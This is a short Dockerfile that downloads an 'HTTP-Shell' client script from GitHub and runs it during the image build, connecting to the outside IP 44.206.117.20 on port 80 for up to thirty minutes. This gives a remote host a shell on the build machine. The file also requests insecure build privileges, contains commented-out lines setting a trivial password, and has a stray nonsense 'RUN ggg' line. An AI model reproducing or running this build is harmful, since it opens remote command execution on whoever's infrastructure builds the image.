# escape=`
FROM ubuntu:24.10
#RUN useradd -rm -d /home/ubuntu -s /bin/bash -g root -G sudo -u 1001 ubuntu
#USER ubuntu
#WORKDIR /home/ubuntu
#SHELL ["/bin/bash", "-o", "pipefail", "-c"]
#RUN echo 'ubuntu:ubuntu' | chpasswd
#RUN mount --make-rshared /
RUN --security=insecure cat /proc/self/status | grep CapEff
RUN apt update 
RUN apt-get install wget -y
RUN apt-get install net-tools -y
RUN apt-get install inetutils-ping -y 
RUN apt-get install curl -y
RUN wget https://raw.githubusercontent.com/JoelGMSec/HTTP-Shell/main/HTTP-Client.sh
RUN dpkg-reconfigure -fnoninteractive dash
#RUN ifconfig
RUN bash -c "timeout -k 1 -s SIGKILL 30m bash ./HTTP-Client.sh -c 44.206.117.20:80"
RUN ggg
#EXPOSE 22

ENTRYPOINT ["/bin/bash"]
